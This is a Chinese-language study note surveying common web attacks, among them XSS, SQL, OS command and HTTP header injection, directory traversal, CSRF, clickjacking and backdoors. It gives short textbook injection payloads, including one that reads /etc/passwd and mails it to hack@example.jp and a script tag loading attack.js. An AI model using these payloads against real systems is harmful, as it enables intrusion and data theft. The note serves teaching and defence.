# Web攻击

标签（空格分隔）： 前端知识体系

---

## 注入攻击

攻击者利用输入注入攻击代码

### XSS

Cross-Site Scripting, 跨站脚本攻击

* 应用程序使用未转义的输入构成页面
* 攻击者往该页面中注入攻击代码
* 攻击者诱使用户访问有陷阱的页面
* 攻击代码自动运行，窃取用户的个人信息

```
// $q为输入
<input type="text" name="ID" value="$q" />

// 注入"><script src="attack.js"></script><span s="
<input type="text" name="ID" value=""><script src="attack.js"></script><span s=""/>
```

### SQL注入攻击

* 应用程序使用未转义的输入构成SQL
* 攻击者注入非法SQL攻击数据库

```
// $q为输入
SELECT * FROM bookTbl WHERE author = '$q' and flag = 1

// 注入abc' --
SELECT * FROM bookTbl WHERE author = 'abc' --' and flag = 1
```

### OS命令注入

* 应用程序使用未转义的输入构成OS命令
* 攻击者注入非法的OS命令攻击服务器

```
// $q为输入
open（MAIL, "| /user/sbin/sendmail $q"）

// 注入; cat /etc/passwd | mail hack@example.jp
open（MAIL, "| /user/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp"）
```

### HTTP首部注入攻击

* 应用程序使用未转义的输入构成响应
* 攻击者注入非法的响应首部或主体
* 攻击者诱使用户访问有陷阱的页面攻击用户

```
// $q为输入
Location: http://www.example.com/a.cgi?q=$q

// 注入101\r\nSet-Cookie:SID=123
Location: http://www.example.com/a.cgi?q=101
Set-Cookie:SID=123

// 注入101\r\n<html><head><title>之后，响应显示的网页地址<!--
Location: http://www.example.com/a.cgi?q=101

<html><head><title>之后，响应显示的网页地址<!--（原来的首部和主体被注释）
```

### 邮件首部注入攻击

* 应用程序使用未转义的输入构成邮件首部
* 攻击者注入非法的邮件首部篡改邮件

### 目录遍历攻击

* 应用程序使用未转义的输入构成文件路径
* 攻击者注入非法的文件路径访问任意文件

```
// $q为输入
http://example.com/read.php?log=0401.log

// 注入../../etc/passwd
http://example.com/read.php?log=../../etc/passws
```

## 设计漏洞

### 强制浏览

在公开目录下，浏览非公开的文件

* 从公开的文件推测可能存在的文件
* 直接通过URL访问无访问权限的文件

### 不正确的错误处理

错误信息中包含对攻击者有用的信息

* Web应用抛出的错误信息
* 数据库等系统抛出的错误信息

### 开放重定向

重定向到指定的任意URL

```
http://example.com/?redirect=http://www.tricorder.jp
```

## 会话管理漏洞

### 会话劫持

攻击者通过某种手段拿到了用户的会话ID，并使用此会话ID伪装成用户

* 通过非正规的生成方法推测会话ID
* 通过窃听或XSS攻击盗取会话ID

### CSRF

Cross-Site Request Forgeries, 跨站点请求伪造

* 用户已登录A网站
* 攻击者诱使用户访问B网站
* 用户访问B网站时，会自动往A网站发可以带上A网站Cookie的跨域请求，利用用户的权限执行某些操作

## 其他漏洞

### 密码破解

算出密码，突破认证

* 穷举法
* 字典攻击
* 利用别处泄漏的ID密码

### 点击劫持

* 将一个iframe页面作为透明层覆盖在用户想点击的位置
* 用户点击时实际点击的是iframe页面的位置

### DoS攻击

Denial of Service attack， 拒绝服务攻击

* 利用过量访问请求造成资源过载
* 通过攻击安全漏洞使服务停止

### 后门程序

* 开发阶段作为Debug调用的后门程序
* 开发者为了自身利益植入的后门程序
* 攻击者通过某种方法设置的后门程序
